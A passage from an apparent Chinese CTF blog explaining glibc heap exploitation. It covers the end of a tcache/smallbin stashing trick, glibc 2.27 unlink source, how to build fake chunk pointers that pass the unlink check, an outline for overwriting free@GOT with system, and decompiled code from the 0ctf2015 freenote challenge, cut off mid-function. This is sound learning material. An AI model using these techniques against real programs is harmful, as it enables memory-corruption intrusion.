位置覆盖成 stack_var 的地址，stack_var 链入 unsortedbin 挂在 chunk_2 前面</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639142183070799/6836a3f671910ad1e6164bfd0f52d6e3c4988066.png" alt="image-20211210211622904"></p><p>71 行，用 calloc 申请一个 0x90 大小的 chunk，calloc 不会从 bin 中取堆块，它会直接在内存中取，此时 tcachebin 中只有 5 个 chunk，smallbin 中有两个 0xa0 大小的堆块 chunk_2 和 stack_var，因此这两个堆块会<strong>反着</strong>挂进 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639142623907442/918ca30ac1831676d832a68d6e4f409b19849d2b.png" alt="image-20211210212343724"></p><p>这样当我们再次申请 0xa0 (data 为 0x90)的 chunk 时，就会把 stack_var 申请出来</p><hr><p>利用的是unlink与small bin向tcache bin中挂堆块的特点，需要注意的是unlink需要配置绕过条件，程序中必须要有calloc才能达到此效果</p><hr><p>参考博客</p><p>hollk 师傅的一系列博客</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之unlink</title>
      <link href="/2021/12/08/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/"/>
      <url>/2021/12/08/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/</url>
      
        <content type="html"><![CDATA[<p>unlink 是一个宏操作，用于将某一个空闲 chunk 从其所处的<strong>双向链表</strong>中脱链。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.27 malloc.c line 1403</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;  <span class="comment">// P:待脱链的空闲chunk的指针;BK:后一个chunk的指针;FD:前一个chunk的指针</span></span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))<span class="comment">//检查物理相邻的下一位chunk的prev_size是否为等于待脱链的空闲chunk的size</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      </span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="comment">//以下为 largebin 操作</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/*如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。</span></span><br><span class="line"><span class="comment">            如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。*/</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)<span class="comment">// 如果 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">                <span class="keyword">else</span> &#123;      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                  &#125;      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">              &#125;      </span><br><span class="line">          &#125;      </span><br><span class="line">      &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>大小检查过后会将 P 链入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;    </span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure><p>效果如图</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638940711922879/90829fe4cc0492ae8a7ed39b679c5770166048e8.png" alt="image-20211208131831689"></p><p>之后会有一个关键检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))            </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><p>绕过这个检查，构造 fake chunk</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &lt;=&gt; *(P-&gt;fd + <span class="number">0x18</span>) == P </span><br><span class="line">p-&gt;bk-&gt;fd == P &lt;=&gt; *(P-&gt;bk + <span class="number">0x10</span>) == P</span><br></pre></td></tr></table></figure><p>可以推出，如果要让<code>P-&gt;fd + 0x18</code>和<code>P-&gt;bk + 0x10</code>都指向<code>p</code>,只需要修改<code>p</code>的 fd 和 bk 为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd = &amp;P - <span class="number">0x18</span> </span><br><span class="line">P-&gt;bk = &amp;P - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>这样就能绕过检查。</p><p>用图表示即为</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638941660238188/a7a92fabc11312d48ad5f66999de7046c2289efe.jpg" alt="Untitled (Draft)-1"></p><h3 id="脱链"><a href="#脱链" class="headerlink" title="脱链"></a>脱链</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>脱链只能在 smallbin / largebin / unsortedbin 中脱，它们都是双向链表，因此脱链操作必须同时修改前后 chunk 的 fd 或者 bk 指针，操作如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK &lt;=&gt; P-&gt;fd-&gt;bk = p-&gt;bk &lt;=&gt; *(P-&gt;fd + <span class="number">0x18</span>) = P-&gt;bk <span class="comment">//Ⅰ</span></span><br><span class="line">BK-&gt;fd = FD &lt;=&gt; P-&gt;bk-&gt;fd = p-&gt;fd &lt;=&gt; *(P-&gt;bk + <span class="number">0x10</span>) = P-&gt;fd <span class="comment">//Ⅱ</span></span><br></pre></td></tr></table></figure><p>结合绕过检查，可以得出如下结果</p><p>对 Ⅰ式做换算，得到 <strong>P = &amp;P - 0x10</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">∵ P-&gt;fd = &amp;P - <span class="number">0x18</span> </span><br><span class="line">∴ *(&amp;P - <span class="number">0x18</span> + <span class="number">0x18</span>) = P-&gt;<span class="function"><span class="params">bk</span> =&gt;</span> P = P-&gt;bk</span><br><span class="line">∵ P-&gt;bk = &amp;P - <span class="number">0x10</span> </span><br><span class="line">∴ P = &amp;P - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>对 Ⅱ 式做换算，得到 <strong>P = &amp;P - 0x18</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">∵ P-&gt;bk = &amp;P - <span class="number">0x10</span> </span><br><span class="line">∴ *(P-&gt;bk + <span class="number">0x10</span>) = P-&gt;<span class="function"><span class="params">fd</span> =&gt;</span> P = P-&gt;fd</span><br><span class="line">∵ P-&gt;fd = &amp;P - <span class="number">0x18</span> </span><br><span class="line">∴ P = &amp;P - <span class="number">0x18</span></span><br></pre></td></tr></table></figure><p>又因为程序运行时从上到下的，所以最终 <strong>P = &amp;P - 0x18</strong></p><p>即断链之后 P 指针将指向 <strong>(&amp;p-0x18)</strong> 的内存</p><p>(假设我们设置 P = free_got, *(&amp;P-0x18) = system，那么当下一次free一个堆块的时候，就会调用system。)</p><p>用图表示即为</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638942514545723/bef785df80979e9d720cf573d67284096cae3167.jpg" alt="B3DEC786D2B39741828C006A9D697DD1"></p><h3 id="largebin-脱链"><a href="#largebin-脱链" class="headerlink" title="largebin 脱链"></a>largebin 脱链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      </span><br><span class="line">           &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">           <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">           <span class="comment">/*如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。</span></span><br><span class="line"><span class="comment">             如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。*/</span></span><br><span class="line">               <span class="keyword">if</span> (P-&gt;fd_nextsize == P) <span class="comment">// 如果 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk</span></span><br><span class="line">                 FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">               <span class="keyword">else</span> &#123;      </span><br><span class="line">                   FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                   FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                   P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                   P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                 &#125;      </span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">               P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">               P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">             &#125;      </span><br><span class="line">         &#125;      </span><br></pre></td></tr></table></figure><p>largebin  脱链相对来说会更复杂<br>先看看 largebin 的结构</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638945747785029/330053826d0fac107fab11641358e925cce71721.png" alt="1345812086_6124"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638945814748879/4794b21608a2086ab4a7b2cd01c8985f0140d223.png" alt="image-20211208144334575"></p><p>首先也有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                </span><br><span class="line">    &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见只有当 P-&gt;fdnextsize != null 时才需要修改，因为如果 P-&gt;fdnextsize == null ，说明 P 是尺寸相同的一组 chunks</p><p>的非第一个 chunk，此时 P 的 fdnextsize 和 bknextsize 是没有意义的，自然没有修改的必要。</p><p>检查通过后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/*如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。</span></span><br><span class="line"><span class="comment">  如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。*/</span></span><br><span class="line">    <span class="keyword">if</span> (P-&gt;fd_nextsize == P) <span class="comment">// 如果 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk</span></span><br><span class="line">      FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">      &#125;      </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">    P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">    P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>对可利用指向 chunk 的 ptr 指针进行操作</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><hr><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>buuctf 0ctf2015_freenote</p><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1639037254302238/6cbbe3df74534de66e97c1ccbf0b64eb969d88f5.png" alt="image-20211209160733957"></p><h3 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h3><h4 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *<span class="title">sub_400A49</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">0x1810</span>uLL);</span><br><span class="line">  *chunk = <span class="number">256LL</span>;</span><br><span class="line">  result = chunk;</span><br><span class="line">  *(chunk + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(chunk + <span class="number">24LL</span> * i + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *(chunk + <span class="number">24LL</span> * i + <span class="number">24</span>) = <span class="number">0LL</span>;</span><br><span class="line">    result = (chunk + <span class="number">24LL</span> * i + <span class="number">32</span>);</span><br><span class="line">    *result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(chunk + <span class="number">8</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;You need to create some new notes first.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = *chunk;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= *chunk )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(chunk + <span class="number">24LL</span> * i + <span class="number">16</span>) == <span class="number">1LL</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d. %s\n&quot;</span>, i, *(chunk + <span class="number">24LL</span> * i + <span class="number">32</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>只能申请 0x80 和 0x180 大小的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(chunk + <span class="number">8</span>) &lt; *chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = *chunk;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= *chunk )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !*(chunk + <span class="number">24LL</span> * i + <span class="number">16</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Length of new note: &quot;</span>);</span><br><span class="line">        size = my_read();</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">            size = <span class="number">0x1000</span>;</span><br><span class="line">          v4 = <span class="built_in">malloc</span>((<span class="number">0x80</span> - size % <span class="number">0x80</span>) % <span class="number">0x80</span> + size);<span class="comment">// 0x80/0x180</span></span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">          sub_40085D(v4, size);</span><br><span class="line">          *(chunk + <span class="number">0x18</span>LL * i + <span class="number">0x10</span>) = <span class="number">1LL</span>;</span><br><span class="line">          *(chunk + <span class="number">0x18</span>LL * i + <span class="number">0x18</span>) = size;</span><br><span class="line">          *(chunk + <span class="number">0x18</span>LL * i + <span class="number">0x20</span>) = v4;</span><br><span class="line">          ++*(chunk + <span class="number">8</span>);</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Unable to create new note.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v3 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt;= *chunk || *(chunk + <span class="number">24LL</span> * v3 + <span class="number">16</span>) != <span class="number">1LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of note: &quot;</span>);</span><br><span class="line">  v2 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != *(chunk + <span class="number">24LL</span> * v3 + <span class="number">24</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = chunk;</span><br><span class="line">    *(v1 + <span class="number">24LL</span> * v3 + <span class="number">32</span>) = <span class="built_in">realloc</span>(*(chunk + <span class="number">24LL</span> * v3 + <span class="number">32</span>), (<span class="number">128</span> - v2 % <span class="number">128</span>) % <span class="number">128</span> + v2);</span><br><span class="line">    *(chunk + <span class="number">24LL</span> * v3 + <span class="number">24</span>) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">  sub_40085D(*(chunk + <span class="number">24LL</span> * v3 + <span class="number">32</span>), v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>存在 uaf 漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(chunk + <span class="number">8</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No notes yet.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v1 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= *chunk 